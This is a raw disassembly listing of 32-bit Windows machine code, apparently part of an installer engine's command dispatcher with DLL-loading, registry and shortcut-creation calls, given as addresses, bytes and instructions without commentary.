  401dd2:	8b c1                	mov    %ecx,%eax
  401dd4:	8b f1                	mov    %ecx,%esi
  401dd6:	83 e0 03             	and    $0x3,%eax
  401dd9:	83 e6 04             	and    $0x4,%esi
  401ddc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401ddf:	8b c1                	mov    %ecx,%eax
  401de1:	c1 e8 1f             	shr    $0x1f,%eax
  401de4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401de7:	8b c1                	mov    %ecx,%eax
  401de9:	c1 e8 1e             	shr    $0x1e,%eax
  401dec:	83 e0 01             	and    $0x1,%eax
  401def:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401df5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401df8:	74 09                	je     0x401e03
  401dfa:	6a 11                	push   $0x11
  401dfc:	e8 d1 0f 00 00       	call   0x402dd2
  401e01:	eb 04                	jmp    0x401e07
  401e03:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401e07:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401e0a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401e0d:	50                   	push   %eax
  401e0e:	ff 75 08             	push   0x8(%ebp)
  401e11:	ff 15 64 82 40 00    	call   *0x408264
  401e17:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401e1a:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401e1f:	50                   	push   %eax
  401e20:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401e23:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401e27:	50                   	push   %eax
  401e28:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401e2b:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e2f:	50                   	push   %eax
  401e30:	ff 75 c8             	push   -0x38(%ebp)
  401e33:	f7 de                	neg    %esi
  401e35:	ff 75 bc             	push   -0x44(%ebp)
  401e38:	1b f6                	sbb    %esi,%esi
  401e3a:	23 35 20 9a 42 00    	and    0x429a20,%esi
  401e40:	56                   	push   %esi
  401e41:	ff 15 44 82 40 00    	call   *0x408244
  401e47:	8b f0                	mov    %eax,%esi
  401e49:	56                   	push   %esi
  401e4a:	ff 75 c8             	push   -0x38(%ebp)
  401e4d:	68 72 01 00 00       	push   $0x172
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff 15 58 82 40 00    	call   *0x408258
  401e5b:	3b c3                	cmp    %ebx,%eax
  401e5d:	74 0c                	je     0x401e6b
  401e5f:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e62:	75 07                	jne    0x401e6b
  401e64:	50                   	push   %eax
  401e65:	ff 15 54 80 40 00    	call   *0x408054
  401e6b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e6e:	0f 8c e2 0d 00 00    	jl     0x402c56
  401e74:	56                   	push   %esi
  401e75:	e9 18 f7 ff ff       	jmp    0x401592
  401e7a:	ff 75 f8             	push   -0x8(%ebp)
  401e7d:	ff 15 48 82 40 00    	call   *0x408248
  401e83:	6a 02                	push   $0x2
  401e85:	8b f0                	mov    %eax,%esi
  401e87:	e8 24 0f 00 00       	call   0x402db0
  401e8c:	59                   	pop    %ecx
  401e8d:	8b d8                	mov    %eax,%ebx
  401e8f:	6a 48                	push   $0x48
  401e91:	6a 5a                	push   $0x5a
  401e93:	56                   	push   %esi
  401e94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e97:	ff 15 48 80 40 00    	call   *0x408048
  401e9d:	50                   	push   %eax
  401e9e:	53                   	push   %ebx
  401e9f:	ff 15 48 81 40 00    	call   *0x408148
  401ea5:	56                   	push   %esi
  401ea6:	ff 75 f8             	push   -0x8(%ebp)
  401ea9:	f7 d8                	neg    %eax
  401eab:	a3 c8 cd 40 00       	mov    %eax,0x40cdc8
  401eb0:	ff 15 4c 82 40 00    	call   *0x40824c
  401eb6:	6a 03                	push   $0x3
  401eb8:	e8 f3 0e 00 00       	call   0x402db0
  401ebd:	a3 d8 cd 40 00       	mov    %eax,0x40cdd8
  401ec2:	8a 45 e0             	mov    -0x20(%ebp),%al
  401ec5:	59                   	pop    %ecx
  401ec6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ec9:	ff 75 d4             	push   -0x2c(%ebp)
  401ecc:	8a c8                	mov    %al,%cl
  401ece:	80 e1 01             	and    $0x1,%cl
  401ed1:	c6 05 df cd 40 00 01 	movb   $0x1,0x40cddf
  401ed8:	88 0d dc cd 40 00    	mov    %cl,0x40cddc
  401ede:	8a c8                	mov    %al,%cl
  401ee0:	80 e1 02             	and    $0x2,%cl
  401ee3:	24 04                	and    $0x4,%al
  401ee5:	68 e4 cd 40 00       	push   $0x40cde4
  401eea:	88 0d dd cd 40 00    	mov    %cl,0x40cddd
  401ef0:	a2 de cd 40 00       	mov    %al,0x40cdde
  401ef5:	e8 bf 46 00 00       	call   0x4065b9
  401efa:	68 c8 cd 40 00       	push   $0x40cdc8
  401eff:	ff 15 5c 80 40 00    	call   *0x40805c
  401f05:	e9 5a 07 00 00       	jmp    0x402664
  401f0a:	53                   	push   %ebx
  401f0b:	e8 a0 0e 00 00       	call   0x402db0
  401f10:	6a 01                	push   $0x1
  401f12:	8b f0                	mov    %eax,%esi
  401f14:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f17:	e8 94 0e 00 00       	call   0x402db0
  401f1c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f1f:	59                   	pop    %ecx
  401f20:	59                   	pop    %ecx
  401f21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f24:	50                   	push   %eax
  401f25:	56                   	push   %esi
  401f26:	75 0b                	jne    0x401f33
  401f28:	ff 15 28 82 40 00    	call   *0x408228
  401f2e:	e9 23 0d 00 00       	jmp    0x402c56
  401f33:	ff 15 50 82 40 00    	call   *0x408250
  401f39:	e9 18 0d 00 00       	jmp    0x402c56
  401f3e:	53                   	push   %ebx
  401f3f:	e8 8e 0e 00 00       	call   0x402dd2
  401f44:	6a 31                	push   $0x31
  401f46:	8b f0                	mov    %eax,%esi
  401f48:	e8 85 0e 00 00       	call   0x402dd2
  401f4d:	6a 22                	push   $0x22
  401f4f:	8b d8                	mov    %eax,%ebx
  401f51:	e8 7c 0e 00 00       	call   0x402dd2
  401f56:	6a 15                	push   $0x15
  401f58:	8b f8                	mov    %eax,%edi
  401f5a:	e8 73 0e 00 00       	call   0x402dd2
  401f5f:	6a ec                	push   $0xffffffec
  401f61:	e8 bd f4 ff ff       	call   0x401423
  401f66:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f69:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f72:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f78:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f7b:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f7e:	66 8b 06             	mov    (%esi),%ax
  401f81:	66 f7 d8             	neg    %ax
  401f84:	1b c0                	sbb    %eax,%eax
  401f86:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f89:	23 c6                	and    %esi,%eax
  401f8b:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f8e:	66 8b 07             	mov    (%edi),%ax
  401f91:	66 f7 d8             	neg    %ax
  401f94:	1b c0                	sbb    %eax,%eax
  401f96:	c7 45 8c 00 50 43 00 	movl   $0x435000,-0x74(%ebp)
  401f9d:	23 c7                	and    %edi,%eax
  401f9f:	89 45 88             	mov    %eax,-0x78(%ebp)
  401fa2:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401fa8:	50                   	push   %eax
  401fa9:	e8 f4 3b 00 00       	call   0x405ba2
  401fae:	85 c0                	test   %eax,%eax
  401fb0:	0f 84 a4 09 00 00    	je     0x40295a
  401fb6:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401fbd:	0f 84 93 0c 00 00    	je     0x402c56
  401fc3:	ff 75 ac             	push   -0x54(%ebp)
  401fc6:	e8 50 4a 00 00       	call   0x406a1b
  401fcb:	ff 75 ac             	push   -0x54(%ebp)
  401fce:	eb 47                	jmp    0x402017
  401fd0:	53                   	push   %ebx
  401fd1:	e8 fc 0d 00 00       	call   0x402dd2
  401fd6:	8b f0                	mov    %eax,%esi
  401fd8:	56                   	push   %esi
  401fd9:	6a eb                	push   $0xffffffeb
  401fdb:	e8 21 36 00 00       	call   0x405601
  401fe0:	56                   	push   %esi
  401fe1:	e8 79 3b 00 00       	call   0x405b5f
  401fe6:	8b f0                	mov    %eax,%esi
  401fe8:	3b f3                	cmp    %ebx,%esi
  401fea:	0f 84 6a 09 00 00    	je     0x40295a
  401ff0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ff3:	74 21                	je     0x402016
  401ff5:	56                   	push   %esi
  401ff6:	e8 20 4a 00 00       	call   0x406a1b
  401ffb:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401ffe:	7c 0b                	jl     0x40200b
  402000:	50                   	push   %eax
  402001:	ff 75 f4             	push   -0xc(%ebp)
  402004:	e8 ba 44 00 00       	call   0x4064c3
  402009:	eb 0b                	jmp    0x402016
  40200b:	3b c3                	cmp    %ebx,%eax
  40200d:	74 07                	je     0x402016
  40200f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402016:	56                   	push   %esi
  402017:	ff 15 fc 80 40 00    	call   *0x4080fc
  40201d:	e9 34 0c 00 00       	jmp    0x402c56
  402022:	6a 02                	push   $0x2
  402024:	e8 a9 0d 00 00       	call   0x402dd2
  402029:	50                   	push   %eax
  40202a:	e8 aa 48 00 00       	call   0x4068d9
  40202f:	8b f0                	mov    %eax,%esi
  402031:	3b f3                	cmp    %ebx,%esi
  402033:	74 13                	je     0x402048
  402035:	ff 76 14             	push   0x14(%esi)
  402038:	ff 75 f4             	push   -0xc(%ebp)
  40203b:	e8 83 44 00 00       	call   0x4064c3
  402040:	ff 76 18             	push   0x18(%esi)
  402043:	e9 4a f5 ff ff       	jmp    0x401592
  402048:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40204b:	66 89 1f             	mov    %bx,(%edi)
  40204e:	66 89 18             	mov    %bx,(%eax)
  402051:	e9 04 09 00 00       	jmp    0x40295a
  402056:	6a ee                	push   $0xffffffee
  402058:	e8 75 0d 00 00       	call   0x402dd2
  40205d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402060:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402063:	51                   	push   %ecx
  402064:	50                   	push   %eax
  402065:	6a 0b                	push   $0xb
  402067:	e8 04 49 00 00       	call   0x406970
  40206c:	ff d0                	call   *%eax
  40206e:	8b f0                	mov    %eax,%esi
  402070:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402073:	66 89 1f             	mov    %bx,(%edi)
  402076:	3b f3                	cmp    %ebx,%esi
  402078:	66 89 18             	mov    %bx,(%eax)
  40207b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402082:	0f 84 ce 0b 00 00    	je     0x402c56
  402088:	56                   	push   %esi
  402089:	6a 40                	push   $0x40
  40208b:	ff 15 10 81 40 00    	call   *0x408110
  402091:	3b c3                	cmp    %ebx,%eax
  402093:	89 45 08             	mov    %eax,0x8(%ebp)
  402096:	0f 84 ba 0b 00 00    	je     0x402c56
  40209c:	6a 0c                	push   $0xc
  40209e:	e8 cd 48 00 00       	call   0x406970
  4020a3:	6a 0d                	push   $0xd
  4020a5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4020a8:	e8 c3 48 00 00       	call   0x406970
  4020ad:	ff 75 08             	push   0x8(%ebp)
  4020b0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4020b3:	56                   	push   %esi
  4020b4:	53                   	push   %ebx
  4020b5:	ff 75 c8             	push   -0x38(%ebp)
  4020b8:	ff 55 c0             	call   *-0x40(%ebp)
  4020bb:	85 c0                	test   %eax,%eax
  4020bd:	74 3c                	je     0x4020fb
  4020bf:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4020c2:	50                   	push   %eax
  4020c3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4020c6:	50                   	push   %eax
  4020c7:	68 14 a0 40 00       	push   $0x40a014
  4020cc:	ff 75 08             	push   0x8(%ebp)
  4020cf:	ff 55 e8             	call   *-0x18(%ebp)
  4020d2:	85 c0                	test   %eax,%eax
  4020d4:	74 25                	je     0x4020fb
  4020d6:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020d9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020dc:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020e0:	57                   	push   %edi
  4020e1:	e8 dd 43 00 00       	call   0x4064c3
  4020e6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020e9:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4020ec:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020f0:	ff 75 f4             	push   -0xc(%ebp)
  4020f3:	e8 cb 43 00 00       	call   0x4064c3
  4020f8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020fb:	ff 75 08             	push   0x8(%ebp)
  4020fe:	e9 34 fb ff ff       	jmp    0x401c37
  402103:	39 1d e0 9a 42 00    	cmp    %ebx,0x429ae0
  402109:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402110:	0f 8c b9 00 00 00    	jl     0x4021cf
  402116:	6a f0                	push   $0xfffffff0
  402118:	e8 b5 0c 00 00       	call   0x402dd2
  40211d:	6a 01                	push   $0x1
  40211f:	8b f8                	mov    %eax,%edi
  402121:	e8 ac 0c 00 00       	call   0x402dd2
  402126:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402129:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40212c:	74 0e                	je     0x40213c
  40212e:	57                   	push   %edi
  40212f:	ff 15 14 81 40 00    	call   *0x408114
  402135:	3b c3                	cmp    %ebx,%eax
  402137:	89 45 08             	mov    %eax,0x8(%ebp)
  40213a:	75 11                	jne    0x40214d
  40213c:	6a 08                	push   $0x8
  40213e:	53                   	push   %ebx
  40213f:	57                   	push   %edi
  402140:	ff 15 18 81 40 00    	call   *0x408118
  402146:	3b c3                	cmp    %ebx,%eax
  402148:	89 45 08             	mov    %eax,0x8(%ebp)
  40214b:	74 7b                	je     0x4021c8
  40214d:	ff 75 bc             	push   -0x44(%ebp)
  402150:	ff 75 08             	push   0x8(%ebp)
  402153:	e8 87 48 00 00       	call   0x4069df
  402158:	8b f8                	mov    %eax,%edi
  40215a:	3b fb                	cmp    %ebx,%edi
  40215c:	74 39                	je     0x402197
  40215e:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402161:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402164:	74 17                	je     0x40217d
  402166:	ff 75 d8             	push   -0x28(%ebp)
  402169:	e8 b5 f2 ff ff       	call   0x401423
  40216e:	ff d7                	call   *%edi
  402170:	85 c0                	test   %eax,%eax
  402172:	74 2d                	je     0x4021a1
  402174:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40217b:	eb 24                	jmp    0x4021a1
  40217d:	68 00 a0 40 00       	push   $0x40a000
  402182:	68 28 ce 40 00       	push   $0x40ce28
  402187:	56                   	push   %esi
  402188:	68 00 04 00 00       	push   $0x400
  40218d:	ff 75 f8             	push   -0x8(%ebp)
  402190:	ff d7                	call   *%edi
  402192:	83 c4 14             	add    $0x14,%esp
  402195:	eb 0a                	jmp    0x4021a1
  402197:	ff 75 bc             	push   -0x44(%ebp)
  40219a:	6a f7                	push   $0xfffffff7
  40219c:	e8 60 34 00 00       	call   0x405601
  4021a1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4021a4:	0f 85 ac 0a 00 00    	jne    0x402c56
  4021aa:	ff 75 08             	push   0x8(%ebp)
  4021ad:	e8 3c 1a 00 00       	call   0x403bee
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	0f 84 9c 0a 00 00    	je     0x402c56
  4021ba:	ff 75 08             	push   0x8(%ebp)
  4021bd:	ff 15 1c 81 40 00    	call   *0x40811c
  4021c3:	e9 8e 0a 00 00       	jmp    0x402c56
  4021c8:	6a f6                	push   $0xfffffff6
  4021ca:	e9 4e 01 00 00       	jmp    0x40231d
  4021cf:	6a e7                	push   $0xffffffe7
  4021d1:	e9 47 01 00 00       	jmp    0x40231d
  4021d6:	6a f0                	push   $0xfffffff0
  4021d8:	e8 f5 0b 00 00       	call   0x402dd2
  4021dd:	6a df                	push   $0xffffffdf
  4021df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021e2:	e8 eb 0b 00 00       	call   0x402dd2
  4021e7:	6a 02                	push   $0x2
  4021e9:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021ec:	e8 e1 0b 00 00       	call   0x402dd2
  4021f1:	6a cd                	push   $0xffffffcd
  4021f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021f6:	e8 d7 0b 00 00       	call   0x402dd2
  4021fb:	6a 45                	push   $0x45
  4021fd:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402200:	e8 cd 0b 00 00       	call   0x402dd2
  402205:	ff 75 bc             	push   -0x44(%ebp)
  402208:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40220b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40220e:	8b c8                	mov    %eax,%ecx
  402210:	8b f8                	mov    %eax,%edi
  402212:	8b f0                	mov    %eax,%esi
  402214:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40221a:	c1 f8 10             	sar    $0x10,%eax
  40221d:	c1 fe 0c             	sar    $0xc,%esi
  402220:	25 ff ff 00 00       	and    $0xffff,%eax
  402225:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402228:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40222e:	83 e6 07             	and    $0x7,%esi
  402231:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402234:	e8 89 3c 00 00       	call   0x405ec2
  402239:	85 c0                	test   %eax,%eax
  40223b:	75 07                	jne    0x402244
  40223d:	6a 21                	push   $0x21
  40223f:	e8 8e 0b 00 00       	call   0x402dd2
  402244:	8d 45 08             	lea    0x8(%ebp),%eax
  402247:	50                   	push   %eax
  402248:	68 cc 84 40 00       	push   $0x4084cc
  40224d:	6a 01                	push   $0x1
  40224f:	53                   	push   %ebx
  402250:	68 dc 84 40 00       	push   $0x4084dc
  402255:	ff 15 90 82 40 00    	call   *0x408290
  40225b:	3b c3                	cmp    %ebx,%eax
  40225d:	0f 8c b1 00 00 00    	jl     0x402314
  402263:	8b 45 08             	mov    0x8(%ebp),%eax
  402266:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402269:	52                   	push   %edx
  40226a:	68 ec 84 40 00       	push   $0x4084ec
  40226f:	8b 08                	mov    (%eax),%ecx
  402271:	50                   	push   %eax
  402272:	ff 11                	call   *(%ecx)
  402274:	3b c3                	cmp    %ebx,%eax
  402276:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402279:	0f 8c 87 00 00 00    	jl     0x402306
  40227f:	8b 45 08             	mov    0x8(%ebp),%eax
  402282:	ff 75 bc             	push   -0x44(%ebp)
  402285:	8b 08                	mov    (%eax),%ecx
  402287:	50                   	push   %eax
  402288:	ff 51 50             	call   *0x50(%ecx)
  40228b:	3b fb                	cmp    %ebx,%edi
  40228d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402290:	75 0e                	jne    0x4022a0
  402292:	8b 45 08             	mov    0x8(%ebp),%eax
  402295:	68 00 50 43 00       	push   $0x435000
  40229a:	50                   	push   %eax
  40229b:	8b 08                	mov    (%eax),%ecx
  40229d:	ff 51 24             	call   *0x24(%ecx)
  4022a0:	3b f3                	cmp    %ebx,%esi
  4022a2:	74 0a                	je     0x4022ae
  4022a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a7:	56                   	push   %esi
  4022a8:	50                   	push   %eax
  4022a9:	8b 08                	mov    (%eax),%ecx
  4022ab:	ff 51 3c             	call   *0x3c(%ecx)
  4022ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b1:	ff 75 c0             	push   -0x40(%ebp)
  4022b4:	8b 08                	mov    (%eax),%ecx
  4022b6:	50                   	push   %eax
  4022b7:	ff 51 34             	call   *0x34(%ecx)
  4022ba:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4022bd:	66 39 19             	cmp    %bx,(%ecx)
  4022c0:	74 0d                	je     0x4022cf
  4022c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c5:	ff 75 b0             	push   -0x50(%ebp)
  4022c8:	8b 10                	mov    (%eax),%edx
  4022ca:	51                   	push   %ecx
  4022cb:	50                   	push   %eax
  4022cc:	ff 52 44             	call   *0x44(%edx)
  4022cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d2:	ff 75 f8             	push   -0x8(%ebp)
  4022d5:	8b 08                	mov    (%eax),%ecx
  4022d7:	50                   	push   %eax
  4022d8:	ff 51 2c             	call   *0x2c(%ecx)
  4022db:	8b 45 08             	mov    0x8(%ebp),%eax
  4022de:	ff 75 f4             	push   -0xc(%ebp)
  4022e1:	8b 08                	mov    (%eax),%ecx
  4022e3:	50                   	push   %eax
  4022e4:	ff 51 1c             	call   *0x1c(%ecx)
  4022e7:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022ea:	7c 11                	jl     0x4022fd
  4022ec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022ef:	6a 01                	push   $0x1
  4022f1:	ff 75 f0             	push   -0x10(%ebp)
  4022f4:	8b 08                	mov    (%eax),%ecx
  4022f6:	50                   	push   %eax
  4022f7:	ff 51 18             	call   *0x18(%ecx)
  4022fa:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022fd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402300:	50                   	push   %eax
  402301:	8b 08                	mov    (%eax),%ecx
  402303:	ff 51 08             	call   *0x8(%ecx)
  402306:	8b 45 08             	mov    0x8(%ebp),%eax
  402309:	50                   	push   %eax
  40230a:	8b 08                	mov    (%eax),%ecx
  40230c:	ff 51 08             	call   *0x8(%ecx)
  40230f:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402312:	7d 13                	jge    0x402327
  402314:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40231b:	6a f0                	push   $0xfffffff0
  40231d:	e8 01 f1 ff ff       	call   0x401423
  402322:	e9 2f 09 00 00       	jmp    0x402c56
  402327:	6a f4                	push   $0xfffffff4
  402329:	eb f2                	jmp    0x40231d
  40232b:	53                   	push   %ebx
  40232c:	e8 a1 0a 00 00       	call   0x402dd2
  402331:	6a 11                	push   $0x11
  402333:	8b f0                	mov    %eax,%esi
  402335:	e8 98 0a 00 00       	call   0x402dd2
  40233a:	6a 23                	push   $0x23
  40233c:	8b f8                	mov    %eax,%edi
  40233e:	e8 8f 0a 00 00       	call   0x402dd2
  402343:	56                   	push   %esi
  402344:	89 45 08             	mov    %eax,0x8(%ebp)
  402347:	e8 8d 45 00 00       	call   0x4068d9
  40234c:	85 c0                	test   %eax,%eax
  40234e:	75 0d                	jne    0x40235d
  402350:	53                   	push   %ebx
  402351:	6a f9                	push   $0xfffffff9
  402353:	e8 a9 32 00 00       	call   0x405601
  402358:	e9 fd 05 00 00       	jmp    0x40295a
  40235d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402360:	56                   	push   %esi
  402361:	89 45 90             	mov    %eax,-0x70(%ebp)
  402364:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  40236b:	e8 22 42 00 00       	call   0x406592
  402370:	57                   	push   %edi
  402371:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402376:	e8 17 42 00 00       	call   0x406592
  40237b:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  402380:	8b 45 08             	mov    0x8(%ebp),%eax
  402383:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402387:	50                   	push   %eax
  402388:	53                   	push   %ebx
  402389:	89 75 98             	mov    %esi,-0x68(%ebp)
  40238c:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40238f:	89 45 aa             	mov    %eax,-0x56(%ebp)
  402392:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  402396:	e8 66 32 00 00       	call   0x405601
  40239b:	8d 45 90             	lea    -0x70(%ebp),%eax
  40239e:	50                   	push   %eax
  40239f:	ff 15 80 81 40 00    	call   *0x408180
  4023a5:	85 c0                	test   %eax,%eax
  4023a7:	0f 84 a9 08 00 00    	je     0x402c56
  4023ad:	eb a1                	jmp    0x402350
  4023af:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023b4:	74 1d                	je     0x4023d3
  4023b6:	68 10 00 20 00       	push   $0x200010
  4023bb:	6a e8                	push   $0xffffffe8
  4023bd:	53                   	push   %ebx
  4023be:	e8 f6 41 00 00       	call   0x4065b9
  4023c3:	50                   	push   %eax
  4023c4:	e8 13 38 00 00       	call   0x405bdc
  4023c9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023ce:	e9 8e 08 00 00       	jmp    0x402c61
  4023d3:	ff 05 b4 9a 42 00    	incl   0x429ab4
  4023d9:	e9 78 08 00 00       	jmp    0x402c56
  4023de:	33 f6                	xor    %esi,%esi
  4023e0:	33 ff                	xor    %edi,%edi
  4023e2:	3b c3                	cmp    %ebx,%eax
  4023e4:	74 08                	je     0x4023ee
  4023e6:	53                   	push   %ebx
  4023e7:	e8 e6 09 00 00       	call   0x402dd2
  4023ec:	8b f0                	mov    %eax,%esi
  4023ee:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023f1:	74 09                	je     0x4023fc
  4023f3:	6a 11                	push   $0x11
  4023f5:	e8 d8 09 00 00       	call   0x402dd2
  4023fa:	8b f8                	mov    %eax,%edi
  4023fc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023ff:	74 09                	je     0x40240a
  402401:	6a 22                	push   $0x22
  402403:	e8 ca 09 00 00       	call   0x402dd2
  402408:	8b d8                	mov    %eax,%ebx
  40240a:	6a cd                	push   $0xffffffcd
  40240c:	e8 c1 09 00 00       	call   0x402dd2
  402411:	50                   	push   %eax
  402412:	53                   	push   %ebx
  402413:	57                   	push   %edi
  402414:	56                   	push   %esi
  402415:	ff 15 20 81 40 00    	call   *0x408120
  40241b:	e9 b9 f1 ff ff       	jmp    0x4015d9
  402420:	a1 10 a0 40 00       	mov    0x40a010,%eax
  402425:	6a 01                	push   $0x1
  402427:	89 45 08             	mov    %eax,0x8(%ebp)
  40242a:	e8 a3 09 00 00       	call   0x402dd2
  40242f:	6a 12                	push   $0x12
  402431:	8b f0                	mov    %eax,%esi
  402433:	e8 9a 09 00 00       	call   0x402dd2
  402438:	6a dd                	push   $0xffffffdd
  40243a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40243d:	e8 90 09 00 00       	call   0x402dd2
  402442:	50                   	push   %eax
  402443:	68 ff 03 00 00       	push   $0x3ff
  402448:	8d 45 08             	lea    0x8(%ebp),%eax
  40244b:	57                   	push   %edi
  40244c:	50                   	push   %eax
  40244d:	ff 75 f0             	push   -0x10(%ebp)
  402450:	56                   	push   %esi
  402451:	ff 15 24 81 40 00    	call   *0x408124
  402457:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  40245b:	e9 1d f3 ff ff       	jmp    0x40177d
  402460:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402463:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402466:	75 2b                	jne    0x402493
  402468:	6a 02                	push   $0x2
  40246a:	e8 a3 09 00 00       	call   0x402e12
  40246f:	8b f0                	mov    %eax,%esi
  402471:	3b f3                	cmp    %ebx,%esi
  402473:	0f 84 e1 04 00 00    	je     0x40295a
  402479:	6a 33                	push   $0x33
  40247b:	e8 52 09 00 00       	call   0x402dd2
  402480:	50                   	push   %eax
  402481:	56                   	push   %esi
  402482:	ff 15 14 80 40 00    	call   *0x408014
  402488:	56                   	push   %esi
  402489:	8b f8                	mov    %eax,%edi
  40248b:	ff 15 10 80 40 00    	call   *0x408010
  402491:	eb 16                	jmp    0x4024a9
  402493:	6a 22                	push   $0x22
  402495:	e8 38 09 00 00       	call   0x402dd2
  40249a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40249d:	d1 f9                	sar    $1,%ecx
  40249f:	51                   	push   %ecx
  4024a0:	50                   	push   %eax
  4024a1:	56                   	push   %esi
  4024a2:	e8 e9 09 00 00       	call   0x402e90
  4024a7:	8b f8                	mov    %eax,%edi
  4024a9:	3b fb                	cmp    %ebx,%edi
  4024ab:	0f 84 a5 07 00 00    	je     0x402c56
  4024b1:	e9 a4 04 00 00       	jmp    0x40295a
  4024b6:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4024b9:	8b f8                	mov    %eax,%edi
  4024bb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4024be:	6a 02                	push   $0x2
  4024c0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024c3:	e8 0a 09 00 00       	call   0x402dd2
  4024c8:	6a 11                	push   $0x11
  4024ca:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4024cd:	e8 00 09 00 00       	call   0x402dd2
  4024d2:	6a 02                	push   $0x2
  4024d4:	50                   	push   %eax
  4024d5:	57                   	push   %edi
  4024d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4024dd:	e8 80 09 00 00       	call   0x402e62
  4024e2:	3b c3                	cmp    %ebx,%eax
